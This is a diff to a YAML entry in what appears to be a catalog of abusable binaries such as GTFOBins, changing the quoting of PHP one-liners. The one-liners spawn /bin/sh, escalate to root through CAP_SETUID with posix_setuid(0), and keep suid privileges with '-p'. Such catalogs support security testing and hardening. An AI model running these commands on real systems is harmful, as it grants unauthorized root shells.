@@ -94,20 +94,19 @@ functions:
       unprivileged:
     tty: false
   - code: |-
-      php -r "pcntl_exec('/bin/sh');"
+      php -r 'pcntl_exec("/bin/sh");'
     contexts:
       capabilities:
         code: |-
-          php -r 'posix_setuid(0); system("/bin/sh -i");'
+          php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
         list:
         - CAP_SETUID
       sudo:
       suid:
         code: |-
-          php -r "pcntl_exec('/bin/sh', ['-p']);"
+          php -r 'pcntl_exec("/bin/sh", ["-p"]);'
         shell: false
       unprivileged:
-    tty: false
   upload:
   - code: |-
       php -S 0.0.0.0:80
